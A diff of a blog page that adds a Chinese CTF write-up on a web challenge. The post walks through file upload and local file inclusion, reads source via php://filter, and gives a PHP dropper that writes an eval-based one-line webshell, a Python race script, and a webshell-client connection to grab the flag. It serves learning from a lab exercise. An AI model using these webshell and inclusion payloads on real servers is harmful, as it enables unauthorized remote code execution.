@@ -6,14 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives | welcome to here</title>
+  <title>web第一题writeup | welcome to here</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="welcome to here">
-<meta property="og:url" content="http://yoursite.com/archives/index.html">
+  <meta name="description" content="第二届工商ctf快要开始了，大家快来做呀？">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web第一题writeup">
+<meta property="og:url" content="http://yoursite.com/2018/03/31/web第一题writeup/index.html">
 <meta property="og:site_name" content="welcome to here">
+<meta property="og:description" content="第二届工商ctf快要开始了，大家快来做呀？">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/0069oIoUgy1fpw0ip5oy6j30ep0buafh.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/0069oIoUgy1fpw0mkdl2uj307p020t8i.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/0069oIoUgy1fpw1u9vvc1j30fi0bkaaw.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/0069oIoUgy1fpw1wsy71xj30g20bjq2x.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/0069oIoUgy1fpw1yjnbigj30eb07h3ye.jpg">
+<meta property="og:updated_time" content="2018-03-31T07:55:05.960Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="welcome to here">
+<meta name="twitter:title" content="web第一题writeup">
+<meta name="twitter:description" content="第二届工商ctf快要开始了，大家快来做呀？">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/0069oIoUgy1fpw0ip5oy6j30ep0buafh.jpg">
   
     <link rel="alternative" href="/atom.xml" title="welcome to here" type="application/atom+xml">
   
@@ -145,295 +155,158 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-web第一题writeup" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      web第一题writeup
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/03/31/web第一题writeup/" class="archive-article-date">
+
+        
+        <a href="/2018/03/31/web第一题writeup/" class="archive-article-date">
   	<time datetime="2018-03-31T06:52:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-31</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/03/31/web第一题writeup/">web第一题writeup</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>第二届工商ctf快要开始了，大家快来做呀？<br><a id="more"></a><br>打开网站后，是一张老葛的女神照片，在submit页面下有文件上传。很明显这是一道考文件上传内容的题。<br><img src="http://ww1.sinaimg.cn/large/0069oIoUgy1fpw0ip5oy6j30ep0buafh.jpg" alt="image"><br>那就用文件上传中的一些方法来测试吧！<br>1.上传1.php里面包含一句话木马<br><img src="http://ww1.sinaimg.cn/large/0069oIoUgy1fpw0mkdl2uj307p020t8i.jpg" alt="image"><br>回显错误不能上传，说明了在服务端那里有白名单过滤。<br>2.那就将一句话木马写在图片中 使用copy 1.jpg/b+1.php/a 2.jpg来生成带一句话木马的图片上传<br>  上传成功。因为从url中的page参数可以看出有文件包含（<a href="https://blog.csdn.net/chence19871/article/details/51906523" target="_blank" rel="noopener">文件包含漏洞解析</a>），那就再来包含刚才的jpg，发现一句话木马并没有执行成功。<br>  这是为什么？老葛的思路还是猥琐没有按照常规来呀。<br>3.既然有文件包含，那就试试用php的伪协议看能不能读源码。（<a href="https://blog.csdn.net/Ni9htMar3/article/details/69812306?locationNum=2&amp;fps=1" target="_blank" rel="noopener">php伪协议知识点</a>）<br>在url的page参数后面构造php伪协议来读取关键脚本upload.phpd的内容，构造如下：<a href="http://10.21.13.153:30000/?page=php://filter/read=convert.base64-encode/resource=upload.php" target="_blank" rel="noopener">http://10.21.13.153:30000/?page=php://filter/read=convert.base64-encode/resource=upload.php</a><br>得到一串base64字符串解码后得到如下源码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;META http-equiv=<span class="string">"content-type"</span> content=<span class="string">"text/html; charset=utf8"</span>&gt; </span><br><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"> include <span class="string">'config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">get_random_string</span></span>()&#123;</span><br><span class="line">    <span class="variable">$random_string</span> = <span class="string">''</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; 16; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$random_string</span> .= substr(<span class="variable">$str</span>, rand(1, 61), 1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$random_string</span>;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">'Upload'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$target_path</span> =<span class="string">"./Err0r/"</span>;</span><br><span class="line">            <span class="variable">$target_name</span> = <span class="variable">$_FILES</span>[<span class="string">'uploaded'</span>][<span class="string">'name'</span>];</span><br><span class="line">            <span class="variable">$target_path</span> = <span class="variable">$target_path</span> . <span class="variable">$target_name</span>;</span><br><span class="line">            <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[<span class="string">'uploaded'</span>][<span class="string">'name'</span>];</span><br><span class="line">            <span class="variable">$uploaded_ext</span> = substr(<span class="variable">$uploaded_name</span>, strrpos(<span class="variable">$uploaded_name</span>, <span class="string">'.'</span>) + 1);</span><br><span class="line">            <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[<span class="string">'uploaded'</span>][<span class="string">'size'</span>]; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="variable">$uploaded_ext</span> == <span class="string">"jpg"</span>  || <span class="variable">$uploaded_ext</span> == <span class="string">"png"</span> || <span class="variable">$uploaded_ext</span> == <span class="string">"gif"</span> ) &amp;&amp; (<span class="variable">$uploaded_size</span> &lt; 100000))&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(!move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">'uploaded'</span>][<span class="string">'tmp_name'</span>], <span class="variable">$target_path</span>)) &#123;</span><br><span class="line">                    </span><br><span class="line">                    <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">                    <span class="built_in">echo</span> <span class="string">'Your image was not uploaded.'</span>;</span><br><span class="line">                    <span class="built_in">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">                </span><br><span class="line">                  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                </span><br><span class="line">                    <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">                    <span class="built_in">echo</span> <span class="variable">$target_path</span>  .<span class="string">' succesfully uploaded!'</span>;</span><br><span class="line">                    <span class="built_in">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                </span><br><span class="line">                <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">'Your image was not uploaded.'</span>;</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line"></span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>一句话木马<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php?</span><br><span class="line"><span class="variable">$file</span>=fopen(<span class="string">'./Err0r/1.php'</span>,<span class="string">'w'</span>);</span><br><span class="line"><span class="variable">$txt</span>=<span class="string">'&lt;?php @eval($_POST["cmd"]);?&gt;'</span>;</span><br><span class="line">fwrite(<span class="variable">$file</span>,<span class="variable">$txt</span>);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p>
+<p>以及存在一个几秒内删除文件的脚本，那就用构造payload来绕过这个限制。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">import requests</span><br><span class="line">url=<span class="string">"http://10.21.13.153:30000/?page=upload.php"</span></span><br><span class="line">file=&#123;<span class="string">'uploaded'</span>:open(<span class="string">'3.jpg'</span>,<span class="string">'rb'</span>)&#125;</span><br><span class="line">data=&#123;<span class="string">'Upload'</span>:<span class="string">'Upload'</span>&#125;</span><br><span class="line">x=requests.post(url,files=file,data=data)</span><br><span class="line">url2=<span class="string">"http://10.21.13.153:30000/index.php?page=./Err0r/3.jpg"</span></span><br><span class="line">y=requests.get(url2)</span><br><span class="line"><span class="built_in">print</span> y.content</span><br></pre></td></tr></table></figure></p>
+<p>运行payload后网页访问url<br><a href="http://10.21.13.153:30000/?page=./Err0r/3.jpg" target="_blank" rel="noopener">http://10.21.13.153:30000/?page=./Err0r/3.jpg</a><br>出现如下结果说明包含成功，<br><img src="http://ww3.sinaimg.cn/large/0069oIoUgy1fpw1u9vvc1j30fi0bkaaw.jpg" alt="image"><br>运行url<a href="http://10.21.13.153:30000/?page=./Err0r/1.php没报错说明脚本写入成功" target="_blank" rel="noopener">http://10.21.13.153:30000/?page=./Err0r/1.php没报错说明脚本写入成功</a><br>那接下来就用菜刀来链接<br><img src="http://ww1.sinaimg.cn/large/0069oIoUgy1fpw1wsy71xj30g20bjq2x.jpg" alt="image"><br>链接成功拿到flag<br><img src="http://ww2.sinaimg.cn/large/0069oIoUgy1fpw1yjnbigj30eb07h3ye.jpg" alt="image"></p>
 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2018/03/31/web第一题writeup/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/03/29/php框架开发/" class="archive-article-date">
-  	<time datetime="2018-03-29T02:09:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-29</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2018/03/29/php框架开发/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">php框架开发</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/03/29/php框架开发/">php框架开发</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/03/15/web安全/" class="archive-article-date">
-  	<time datetime="2018-03-15T05:01:37.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-15</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/03/15/web安全/">web安全</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/03/12/csrf学习/" class="archive-article-date">
-  	<time datetime="2018-03-12T01:35:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-12</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/03/12/csrf学习/">web学习</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/03/10/sql注入的预防/" class="archive-article-date">
-  	<time datetime="2018-03-10T08:41:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-10</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/03/10/sql注入的预防/">sql注入的预防</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/03/06/渗透测试流程-1/" class="archive-article-date">
-  	<time datetime="2018-03-06T12:59:21.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-06</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/03/06/渗透测试流程-1/">渗透测试流程</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/01/19/xss简介/" class="archive-article-date">
-  	<time datetime="2018-01-19T12:54:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-19</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/01/19/xss简介/">xss学习</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/01/08/上传漏洞fckeditor的利用/" class="archive-article-date">
-  	<time datetime="2018-01-08T05:51:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-08</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/01/08/上传漏洞fckeditor的利用/">上传漏洞fckeditor的利用</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/01/07/木马制作及服务器上传漏洞/" class="archive-article-date">
-  	<time datetime="2018-01-07T04:37:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-07</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/01/07/木马制作及服务器上传漏洞/">木马制作及服务器上传漏洞</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/01/04/跳一跳基于python下的高分/" class="archive-article-date">
-  	<time datetime="2018-01-04T08:19:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-04</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/01/04/跳一跳基于python下的高分/">跳一跳基于python下的高分</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="page-number" href="/archives/page/3/">3</a><a class="extend next" rel="next" href="/archives/page/2/">Next &raquo;</a>
-    </nav>
   
 
 
@@ -457,8 +330,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
